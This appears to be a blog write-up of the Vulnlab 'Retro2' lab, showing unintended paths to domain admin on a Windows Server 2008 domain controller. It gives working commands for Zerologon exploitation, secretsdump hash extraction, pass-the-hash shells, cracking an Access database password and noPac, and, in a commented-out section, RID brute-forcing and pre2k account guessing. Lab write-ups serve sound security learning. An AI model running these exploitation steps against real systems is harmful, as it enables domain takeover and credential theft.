+++
title = '[Vulnlab] Retro2 - Unintended Solves'
date = 2024-10-09T21:22:04+02:00
draft = false
tags = ['pentesting']
+++

![Retro2 Slide](/images/vulnlab_retro2/retro2_slide.png)

There is an intended path that involves the usual steps of 
enumerating users, compromising one user, pivoting to the next ...
There are some nice writeups out there, I liked the one from 
[serioton](https://seriotonctf.github.io/2024/08/25/Retro2-Vulnlab/).

But let's skip that! As the name suggests, we are dealing with a `Retro` 
machine. Wouldn't it be a shame if we throw our modern knowledge at it
to immediately get domain admin?


# Walkthrough
Windows Machine! Let's test `enum4linux` to get all the information:

```bash
$enum4linux-ng -A $IP -u 'a' -p ''
...
DNS domain: retro2.vl
FQDN: BLN01.retro2.vl
[+] Domain SID: S-1-5-21-1604173555-1041150481-2903404482

SHARES:
[*] Testing share Public
[+] Mapping: OK, Listing: OK

[+] After merging OS information we have the following result:
OS: Windows Server 2008 R2 Datacenter 7601 Service Pack 1
OS version: '6.1'
OS release: ''
OS build: '7601'
Native OS: Windows Server 2008 R2 Datacenter 7601 Service Pack 1
Native LAN manager: Windows Server 2008 R2 Datacenter 6.1
```

First, add the entries to the `/etc/hosts` file
```bash
echo -e "$IP\tBLN01.retro2.vl\tretro2.vl" >> /etc/hosts
```

I don't include the port scan since it's not needed for this challenge.

Let's evaluate our findings:
1. We can access a `Public` share with a guest user
2. The Server is Windows Server 2008

## 0. Windows server 2008
According to Google, and a blog post from [Hewlett Packard Enterprise](https://www.hpe.com/emea_europe/en/servers/windows-server-2008-end-of-support-migration.html). 
The end of Life for Windows Server 2008 was January 14th, 2020.
![Windows EOL](/images/vulnlab_retro2/windows2008EOL.png)

It's highly likely (even if not intended) that the server is vulnerable to 
CVE's that were published after that date.

Since I assume that the `netexec` developers are busy bees implementing the
latest and greatest recent exploit, we can go through the list of modules and 
see which exploits we want to test. We only focus on the *LOW PRIVILEGE MODULES*
```
$ nxc smb -L
LOW PRIVILEGE MODULES
[*] add-computer              Adds or deletes a domain computer
[*] dfscoerce                 Module to check if ...
...
```

Here is a (super) basic rundown of all modules according to the description and some basic googling. No guarantee that I'm right 
| Module | Info |
| ------ | ---- |
| add-computer| Utility |
| dfscoerce| Exploit -> NTLM-relay/Responder |
| drop-sc| Utility - Write file to writable shares |
| enum_av| Utility - Antivirus |
| enum_ca| Utitily - Certificate Authorities |
| gpp_autologin| Utility - Plaintext Passwords |
| gpp_password| Utility - Plaintext Passwords| 
| ioxidresolver| Utility - find more interfaces |
| ms17-010| Exploit - Admin on any machine (disclosure 14.04.2017) |
| nopac| **Exploit - Domain User -> Domain Admin (disclosure 09.11.2021)** |
| petitpotam| Exploit -> NTLM-relay/Responder|
| printerbug| Exploit -> NTLM-relay/Responder|
| printnightmare| **Exploit -> RCE+Privesc (disclosure 29.06.2021)**|
| scuffy| Utility - Write files to writable shares|
| shadowcoerce| Exploit -> NTLM-relay/Responder|
| slinky| Utility - Write file to writable shares |
| spider_plus| Utility - List all files |
| spooler| Utility - Detect printspooler |
| webdav| Utility - Detect WebClient service |
| zerologon| **Exploit -> Domain Admin (disclosure 11.08.2020)**|

The interesting modules are:
* nopac - requires Domain User
* printnightmare - requires Domain User
* zerologon

Since zerologon doesn't even require a domain user, we start with that one
## 1. zerologon
```bash
nxc smb BLN01.retro2.vl -M zerologon
[...]
[+] retro2.vl\FS01$ from ccache
VULNERABLE
Next step: https://github.com/dirkjanm/CVE-2020-1472
```

### Exploiting Zerologon
Exegol has an inbuilt alias to exploit zerologon, but 
in general it just uses the [github exploit](https://github.com/dirkjanm/CVE-2020-1472?tab=readme-ov-file)

According to the Readme the steps are:
1. Run the exploit which will set the DA password to empty string
2. Dump NTLM hashes
3. (Optional) Revert Password to original to not break the system

### 1. Run the exploit
```bash
$ zerologon-exploit.py $TARGET $IP
Performing authentication attempts...
=================================================================================================================
Target vulnerable, changing account password to empty string

Result: 0
```
### 2. Extract NTLM hashes
```bash
secretsdump.py -no-pass "$DOMAIN"/'BLN01$'@"$IP" -just-dc

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:********************************:::
[...]
```

### 3. (Optional) Restore Password
To restore the original password, we need to first get the original password via 
by secretsdumping again with the `Administrator` Account:
```bash
secretsdump -hashes :"$NT_HASH" "$DOMAIN"/Administrator@"$DC_HOST"

[...]
RETRO2\BLN01$:plain_password_hex:4fa92[...]
```

And then run the restore script:
```bash
$ zerologon-restore.py -hexpass "***[...]" "$DOMAIN"/BLN01@BLN01 -target-ip "$IP"
Impacket v0.11.0 - Copyright 2023 Fortra

[*] StringBinding ncacn_ip_tcp:10.10.110.108[49158]
Change password OK
```

### 4. Victory
With the Administrator Hash we can grab both flags:
```powershell
$wmiexec.py -hashes :"$NT_HASH" "$DOMAIN"/"$USER"@"$TARGET"
Impacket for Exegol - v0.10.1.dev1+20240403.124027.3e5f85b - Copyright 2022 Fortra - forked by ThePorgs

[*] SMBv2.1 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
retro2\administrator
C:\>type user.txt
VL{********************************}
C:\>type Users\Administrator\Desktop\root.txt
VL{********************************}
```

## 2.0 Interlude - getting domain users
For `printnightmare` and `nopac` we need a domain user. Let's get one!
`enum4linux` already told us that we can access a SMB Share.

Let's check what's inside:
```bash
$ nxc smb "$IP" -u 'guest' -p '' -M spider_plus
 [+] Saved share-file metadata to "/tmp/nxc_spider_plus/10.10.110.108.json".
 [*] SMB Shares:           6 (ADMIN$, C$, IPC$, NETLOGON, Public, SYSVOL)
 [*] SMB Readable Shares:  1 (Public)
 [*] Total folders found:  2
 [*] Total files found:    1

$ cat /tmp/nxc_spider_plus/10.10.110.108.json | jq
  "Public": {
    "DB/staff.accdb": {
      [...]
```
There is only one `staff.accdb`. After downloading it, we can see that it's a microsoft
Access database.

*Note:* Things get a lot easier if using a windows machine. `mbdtools` for example didn't
tell me that the database was encrypted.

Opening the file in Microsoft access prompts a password:
![Password prompt of Microsoft access](/images/vulnlab_retro2/access.png)

Let's crack it:
```bash
$ office2john.py staff.accdb > hashes.txt
$ hashcat --username -m 9600 hashes.txt /opt/rockyou.txt

[...]
$office$*2013*100000*256*16*5736cfcbb054e749a8f303570c5c1970*1ec683f4d8c4e9faf77d3c01f2433e56*7de0d4af8c54c33be322dbc860b68b4849f811196015a3f48a424a265d018235:******
```
Using the password `*******`, we unlock the microsoft access database.
This includes a Visual Basic Script with a domain user: 
![Credentials in Access database](/images/vulnlab_retro2/access_creds.png)

Now we have credentials for the the user `ldapreader`

## 2.1 nopac
Checking with our domain user we can see that `nopac` works and 
`printnightmare` doesn't.

The commands to check are:
```
nxc smb "$IP" -u "$USER" -p "$PASS" -M nopac
nxc smb "$IP" -u "$USER" -p "$PASS" -M printnightmare
```

![nopac and printnightmare](/images/vulnlab_retro2/nopac.png)

The exploit is really simple, the command to get an Admin shell is:
```bash
noPac.py "$DOMAIN"/"$USER":"$PASSWORD" -dc-ip "$DC_IP" -shell --impersonate "Administrator" -use-ldap
```

![nopac exploited](/images/vulnlab_retro2/exploit_nopac.png)

<!-- ## Real path 1. Usernames
With a guest login, we can get usernames with `netexec rid-brute`:
```bash
$ nxc smb "$IP" -u 'guest' -p '' --rid-brute | tee u
SMB                      10.10.66.223    445    BLN01            [+] retro2.vl\guest:
SMB                      10.10.66.223    445    BLN01            498: RETRO2\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB                      10.10.66.223    445    BLN01            500: RETRO2\Administrator (SidTypeUser)
SMB                      10.10.66.223    445    BLN01            501: RETRO2\Guest (SidTypeUser)
SMB                      10.10.66.223    445    BLN01            502: RETRO2\krbtgt (SidTypeUser)
[...]
```

and use some bash magic to generate a users list
```bash
$ grep SidTypeUser u | awk '{print $6}' | cut -d '\' -f2 | tee users.txt
Administrator
Guest
krbtgt
admin
BLN01$
[...]
```
## 2. Domain User
There a two quick ways to get a domain users with a username list:
1. `username=password`
2. pre2k Machine accounts 
### username=password
The command is this, but there is no simple password
```
nxc smb "$IP" -u users.txt -p users.txt --continue-on-success --no-bruteforce
```

### pre2k users
[Pre Created User Accounts](https://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts)
are accounts that:
1. End with a $
2. The password is the username in lowercase without the $

Due to how authentication functions, the nicest way is to just create a TGT
for those users. We can use impacket's `getTGT` or use a nice shiny specialize tool [pre2k](https://github.com/garrettfoster13/pre2k?tab=readme-ov-file).

```bash
grep '\$' users.txt > pre2kusers.txt
pre2k unauth -d "$DOMAIN" -dc-ip "$IP" -inputfile pre2kusers.txt
 -save
[21:55:02] INFO     VALID CREDENTIALS: retro2.vl\FS02$:fs02
[21:55:02] INFO     Saving ticket in FS02$.ccache
[21:55:05] INFO     VALID CREDENTIALS: retro2.vl\FS01$:fs01
```


## TODO
```
export KRB5CCNAME="$(realpath ./FS01\$.ccache)"
```
### nopac
My tool seems broken, let's get back to it later:

```bash
$ nxc smb BLN01.retro2.vl --use-kcache -M nopac
[...j]
KerberosError: Kerberos SessionError: KDC_ERR_PREAUTH_FAILED(Pre-authentication
                    information was invalid)
```

### printnightmare
```bash
nxc smb BLN01.retro2.vl --use-kcache -M printnightmare
[-] Failed to bind: Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
```
```
bloodhound.py --zip -c All -d "$DOMAIN" -k -u 'FS01$' -no-pass -
ns $IP
``` -->

# Summary
1. Find out that we are dealing with Windows Server 2008
Path zerologon:
2. Zerologon to domain admin
Path nopac:
2. Get domain user via Access database in public share
3. nopac to domain admin

## Relevant information
1. Server Version
2. Content of Public SMB Share